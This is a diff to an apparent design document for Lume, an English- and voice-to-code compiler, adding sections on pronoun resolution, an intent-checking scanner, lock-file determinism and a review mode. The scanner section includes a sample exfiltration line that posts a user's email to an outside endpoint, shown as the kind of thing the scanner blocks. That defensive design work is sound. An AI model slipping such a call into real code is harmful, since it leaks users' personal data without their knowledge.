@@ -369,6 +369,37 @@ AI resolution (Layer B) is non-deterministic — the same prompt may produce dif
 
 On recompilation: if the input line is unchanged and a lock entry exists, the locked resolution is used (no AI call). If the input changes, re-resolve and update the lock. `lume build --fresh` ignores the lock for full re-resolution. The lock file is committed to version control.
 
+### 4.10 Anaphora Resolution and the Context Stack
+
+In English Mode, developers naturally use pronouns: "show **it**", "delete **them**", "sort **that result**". A naive compiler rejects these as ambiguous. Lume introduces a **Context Stack** — a temporal state machine that tracks referential context across instructions.
+
+The stack maintains state for the previous **5 instructions** with two primary registers:
+
+- `LastSubject` — The most recent singular entity (e.g., `currentUser`, `orderTotal`)
+- `LastCollection` — The most recent plural entity (e.g., `activeUsers`, `searchResults`)
+
+**Resolution Rules:**
+
+| Pronoun | Resolution | Example |
+|---------|------------|--------|
+| "it" / "this" | `LastSubject` | "get the user" → "show it" resolves to `show(user)` |
+| "them" / "those" | `LastCollection` | "get all users" → "delete them" resolves to `delete(users)` |
+| "that result" / "the output" | Return value of last expression | "calculate the total" → "display that result" |
+| "the previous" / "the last one" | Temporal Resolver (stack index -1) | "get the first item" → "now get the previous" |
+
+If the stack is ambiguous (e.g., multiple candidates for `LastCollection`), the compiler emits `DisambiguationRequired`:
+
+```
+⚠ DisambiguationRequired at line 4:
+  "delete them" — ambiguous reference.
+  Did you mean:
+    (a) delete activeUsers    [LastCollection, set at line 2]
+    (b) delete expiredTokens   [LastCollection, set at line 1]
+  Clarify with: "delete the active users" or "delete the expired tokens"
+```
+
+The stack is bounded (5 instructions) to prevent stale references from causing silent errors. This transforms English's greatest weakness (ambiguity) into a structured, deterministic feature.
+
 ---
 
 ## 5. Voice-to-Code Architecture
@@ -605,6 +636,34 @@ A natural objection is that compiler-integrated security is not novel — Rust g
 **The key insight:** Rust prevents unsafe *memory operations*. Ada/SPARK proves code matches a *formal specification the developer wrote*. ESLint catches *known bad patterns* in code that already exists. Lume catches *dangerous intent* — it knows the developer said "delete all user records" and can distinguish that from "delete expired session tokens" because it has access to the original English instruction, not just the generated `DELETE FROM` query.
 
 These are complementary, not competing, paradigms. Rust and Lume could coexist — a future Lume backend targeting Rust output would benefit from both intent-aware security (Lume) and memory safety (Rust). But the specific combination of **semantic intent scanning at compilation time with mandatory enforcement and tamper-evident certification** is, to our knowledge, novel.
+
+### 6.7 Negative-Constraint Scanner (Closing the Semantic Gap)
+
+The "Certified at Birth" claim raises a critical question: *How do we know the generated code actually matches the developer's intent?* If a user says "Show the user's name" but the compiler generates an AST that also exfiltrates the email via a network call, the certificate is a lie.
+
+Lume addresses this with a **Negative-Constraint Scanner** — a verification layer that checks not just what each AST node *does*, but what it *doesn't do*.
+
+**Intent Classification:**
+
+| Intent Category | Permitted Side Effects | Forbidden Side Effects |
+|----------------|----------------------|----------------------|
+| Display / Read | Screen output, logging | Network, file write, database mutation |
+| Calculate | Memory (local variables) | Network, file system, database |
+| Store / Save | Database write, file write | Network egress, privilege escalation |
+| Delete | Targeted resource removal | Cascade deletion beyond scope, network |
+| Send / Transmit | Network egress (scoped) | File system, unauthorized endpoints |
+
+For each AST node generated from English: (1) classify the original instruction's intent category, (2) traverse the generated AST subtree, (3) verify no child node invokes a forbidden side effect. If a mismatch is found:
+
+```
+✗ SemanticMismatchError at line 7:
+  Intent: "show the user's name" → classified as [Display/Read]
+  Generated AST contains: fetch('https://external.api/log', {body: user.email})
+  Violation: [Display/Read] intent generated [Network] side effect.
+  This instruction will not compile until the semantic mismatch is resolved.
+```
+
+This transforms the security certificate from a *compilation attestation* into a *semantic attestation*: the certificate proves not just that the code compiled, but that the code's behavior is consistent with the developer's stated intent.
 
 ---
 
@@ -1043,6 +1102,118 @@ Voice-to-code is not merely convenient — it is architecturally significant for
 - Non-English speakers can program in their native language (Milestone 8)
 
 This positions accessibility as an architectural consequence of the design, not an afterthought accommodation.
+
+### 11.6 AI Agents and the Middleman Paradox
+
+AI coding agents (Copilot, ChatGPT, Cursor) reduce some transformation dimensions but **increase the total chain length**:
+
+```
+Traditional:     Developer → Compiler                    (2 nodes, 1 hop)
+AI-Assisted:     Developer → AI → Review → Compiler      (4 nodes, 3 hops)
+Lume:            Developer → Compiler                    (2 nodes, 1 hop)
+```
+
+The AI is a **middleman**. It reduces T₁–T₃ but increases T₅ (composing effective prompts is its own skill) and T₆ (debugging AI-generated code requires understanding patterns you didn't choose). Net CD may decrease, but the **chain of trust** lengthens.
+
+Lume eliminates the middleman. The compiler IS the understanding layer.
+
+**Error Recovery: Chain of Custody Comparison**
+
+| Failure Scenario | AI Agent (Copilot/ChatGPT) | Lume |
+|-----------------|---------------------------|------|
+| **Wrong code generated** | Developer must debug code they didn't write (High CD) | Compiler stops and asks for clarification (Zero Silent Errors) |
+| **Subtle logic error** | AI passes syntax but fails at runtime; developer traces unfamiliar patterns | Semantic scanner catches intent mismatch at compile time |
+| **Ambiguous intent** | AI guesses silently; developer may never know | Compiler emits DisambiguationRequired; refuses to proceed |
+| **Security vulnerability** | Ships to production; discovered days/weeks later by external scanners | Guardian Scanner blocks compilation; vulnerability never enters codebase |
+| **Regression detection** | Developer must manually verify correctness | Resolution Manifest locks mappings; drift detected automatically |
+
+**The critical distinction:** AI agents fail *silently* — the human must find the mistake in code they didn't write (maximum cognitive distance). Lume fails *loudly* — the compiler refuses to produce output until the ambiguity is resolved (zero cognitive distance).
+
+This justifies the T₆ (meta-cognitive) weight in the CD formula: debugging AI-generated code requires reverse-engineering the AI's thought process, a uniquely taxing cognitive operation that Lume eliminates entirely.
+
+### 11.7 Ambiguity Resolution Protocol and the Resolution Manifest
+
+The single biggest threat to Lume's credibility is **non-determinism**. If "get the users" compiles to `SELECT * FROM users` today but the AI model updates tomorrow and produces `DELETE FROM users`, the language fails.
+
+**Canonical Lume Syntax (CLS):**
+
+Every English-mode instruction, once resolved, maps to a **Canonical Lume Syntax** expression — a deterministic intermediate representation independent of AI model version, tolerance chain weights, or runtime environment.
+
+```
+// English input:
+get all the users who signed up this month
+
+// Canonical Lume Syntax (CLS):
+QUERY users WHERE created_at >= MONTH_START(CURRENT_DATE)
+
+// Generated JavaScript:
+const result = await db.query('SELECT * FROM users WHERE created_at >= ...');
+```
+
+**The Resolution Manifest (`lume-lock.json`):**
+
+```json
+{
+  "manifestVersion": "1.0",
+  "compiler": "lume@0.4.2",
+  "entries": [
+    {
+      "line": 1,
+      "source": "get all the users who signed up this month",
+      "sourceType": "text",
+      "cls": "QUERY users WHERE created_at >= MONTH_START(CURRENT_DATE)",
+      "resolvedBy": "ExactPatternMatch",
+      "confidence": 0.97,
+      "astHash": "sha256:a3f8b2c1...",
+      "outputHash": "sha256:9e4d1f0a..."
+    }
+  ]
+}
+```
+
+**Voice-Specific Guarantees:**
+
+If the input is voice, the manifest stores the **cleaned text**, not raw audio:
+
+```json
+{
+  "sourceType": "voice",
+  "rawTranscription": "get all the users who signed up this month uhh",
+  "cleanedText": "get all the users who signed up this month",
+  "cleanupApplied": ["filler_removal"],
+  "cls": "QUERY users WHERE created_at >= MONTH_START(CURRENT_DATE)"
+}
+```
+
+This ensures builds are **reproducible 10 years from now** — even if the voice engine changes, the manifest preserves the exact cleaned input and CLS.
+
+**Determinism Guarantees:**
+
+| Property | Mechanism |
+|----------|----------|
+| Same text → same AST | CLS deterministic; manifest locks mapping |
+| Same voice → same AST | Cleaned text stored; recompilation uses text |
+| AI model updates | Layer B results cached in manifest |
+| Compiler version changes | Manifest records version; warnings on mismatch |
+| Drift detection | `lume verify` compares current vs. manifest |
+
+### 11.8 Review Mode — HCI Transparency Layer
+
+Lume provides a **Review Mode** where the compiler shows the developer exactly what it understood before executing:
+
+```
+$ lume compile app.lume --review
+
+  Line 1: "get all the users who signed up this month"
+  ├─ Intent: QUERY on collection 'users'
+  ├─ Filter: created_at >= start of current month
+  ├─ Resolved by: ExactPatternMatch (confidence: 0.97)
+  └─ Output: const result = await db.query('SELECT * ...');
+  
+  ✓ Approve?  [y]es / [n]o / [e]dit
+```
+
+No code is emitted until the developer confirms each resolution. This provides human-in-the-loop verification without adding cognitive distance — the developer reviews the compiler's understanding in plain English, not in generated code.
 
 ---
 
